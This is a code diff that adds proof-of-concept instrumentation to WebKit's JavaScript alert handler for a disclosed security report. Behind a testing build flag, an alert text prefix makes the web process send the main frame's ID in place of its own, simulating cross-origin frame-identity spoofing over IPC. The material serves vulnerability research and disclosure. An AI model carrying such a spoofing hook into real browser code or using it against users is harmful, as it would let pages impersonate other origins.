@@ -1,0 +1,38 @@
+diff --git a/Source/WebKit/WebProcess/WebCoreSupport/WebChromeClient.cpp b/Source/WebKit/WebProcess/WebCoreSupport/WebChromeClient.cpp
+index 7c274ca2..6f52fef7 100644
+--- a/Source/WebKit/WebProcess/WebCoreSupport/WebChromeClient.cpp
++++ b/Source/WebKit/WebProcess/WebCoreSupport/WebChromeClient.cpp
+@@ -644,7 +644,32 @@ void WebChromeClient::runJavaScriptAlert(LocalFrame& frame, const String& alertT
+ 
+     auto relay = AXRelayProcessSuspendedNotification(*page);
+ 
+-    page->sendSyncWithDelayedReply(Messages::WebPageProxy::RunJavaScriptAlert(webFrame->frameID(), webFrame->info(), alertText), { IPC::SendSyncOption::MaintainOrderingWithAsyncMessages });
++    auto frameIDToSend = webFrame->frameID();
++    auto alertTextToSend = alertText;
++#if ENABLE(IPC_TESTING_API)
++    // --- Disclosed PoC instrumentation for Apple Security Research report OE11044060622355 ---
++    // ("WebKit WebPageProxy: cross-origin frame-identity spoofing via unauthenticated process
++    // IPC"). This block stands in for what a compromised WebContent process could do on its own:
++    // send the real Messages::WebPageProxy::RunJavaScriptAlert IPC message naming a
++    // FrameIdentifier it does not own, instead of its own. Here that's the top-level/main
++    // frame's real, legitimate id -- reachable locally even when that frame is Remote via
++    // frame.mainFrame().frameID() (WebCore::Frame::frameID()/::mainFrame(),
++    // Source/WebCore/page/Frame.h:88-94, inherited unmodified by RemoteFrame). frameInfo
++    // (webFrame->info(), passed below unchanged) is deliberately left completely real/untouched
++    // -- only the frameID argument is substituted -- so this isolates exactly this report's
++    // claimed bug (the receiving handler trusts frameID without checking which process actually
++    // sent it) from any separate question of whether frameInfo's own contents can be forged.
++    // Everything downstream of this send (WebPageProxy::runJavaScriptAlert, API::FrameInfo,
++    // WKFrameInfo) is completely stock, unmodified WebKit.
++    static constexpr auto pocFrameSpoofMarker = "POC_FRAME_SPOOF:"_s;
++    if (alertText.startsWith(pocFrameSpoofMarker)) {
++        frameIDToSend = frame.mainFrame().frameID();
++        alertTextToSend = alertText.substring(pocFrameSpoofMarker.length());
++    }
++    // --- end disclosed PoC instrumentation ---
++#endif
++
++    page->sendSyncWithDelayedReply(Messages::WebPageProxy::RunJavaScriptAlert(frameIDToSend, webFrame->info(), alertTextToSend), { IPC::SendSyncOption::MaintainOrderingWithAsyncMessages });
+ }
+ 
+ bool WebChromeClient::runJavaScriptConfirm(LocalFrame& frame, const String& message)
